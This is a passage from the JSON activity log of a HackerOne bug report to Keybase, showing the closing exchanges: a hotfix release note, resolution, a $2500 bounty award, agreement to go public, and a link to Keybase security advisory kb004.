binary?)\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-03T10:59:34.930Z","updated_at":"2019-01-03T10:59:34.930Z","actor":{"username":"jinmo123","cleared":false,"url":"/jinmo123","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3919533,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for taking a look! We'll likely get hotfix 2.12.6 out today that unbreaks those who use active directory. Both 2.12.5 and 2.12.6 should have the bugfix for this bug.\n\nWe'll look into some more refactors with uninstallation.  It seems inherently safer though since we're just removing files. \n\nThanks! We'll try to close out and bounty these issues soon. We really appreciate your hard work and great communication on this issue.","markdown_message":"\u003cp\u003eThanks for taking a look! We\u0026#39;ll likely get hotfix 2.12.6 out today that unbreaks those who use active directory. Both 2.12.5 and 2.12.6 should have the bugfix for this bug.\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;ll look into some more refactors with uninstallation.  It seems inherently safer though since we\u0026#39;re just removing files. \u003c/p\u003e\n\n\u003cp\u003eThanks! We\u0026#39;ll try to close out and bounty these issues soon. We really appreciate your hard work and great communication on this issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-03T12:33:47.554Z","updated_at":"2019-01-03T12:33:47.554Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4066238,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2019-01-30T18:15:43.720Z","updated_at":"2019-01-30T18:15:43.720Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jinmo123","url":"/jinmo123"},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4066245,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2019-01-30T18:15:59.531Z","updated_at":"2019-01-30T18:15:59.531Z","actor":{"url":"/keybase","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Keybase"}},"bounty_amount":"2500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"keybase","collaborator":{"username":"jinmo123","url":"/jinmo123"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4066247,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-01-30T18:16:08.128Z","updated_at":"2019-01-30T18:16:08.128Z","first_to_agree":true,"actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4066280,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We posted this security update: https://keybase.io/docs/secadv/kb004","markdown_message":"\u003cp\u003eWe posted this security update: \u003ca title=\"https://keybase.io/docs/secadv/kb004\" href=\"/redirect?url=https%3A%2F%2Fkeybase.io%2Fdocs%2Fsecadv%2Fkb004\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://keybase.io/docs/secadv/kb004\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-30T18:20:47.010Z","updated_at":"2019-01-30T18:20:47.010Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4066689,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you!","markdown_message":"\u003cp\u003eThank you!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-30T18:51:59.583Z","updated_at":"2019-01-30T18:51:59.583Z","actor":{"username":"jinmo123","cleared":false,"url":"/jinmo123","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4066727,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for the great report!","markdown_message":"\u003cp\u003eThank you for the great report!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-01-30T18:58:44.275Z","updated_at":"2019-01-30T18:58:44.275Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4066734,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-01-30T18:59:22.239Z","updated_at":"2019-01-30T18:59:22.239Z","actor":{"username":"jinmo123","cleared":false,"url":"/jinmo123","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4066735,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-01-30T18:59:22.312Z","updated_at":"2019-01-30T18:59:22.312Z","actor":{"username":"jinmo123","cleared":false,"url":"/jinmo123","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}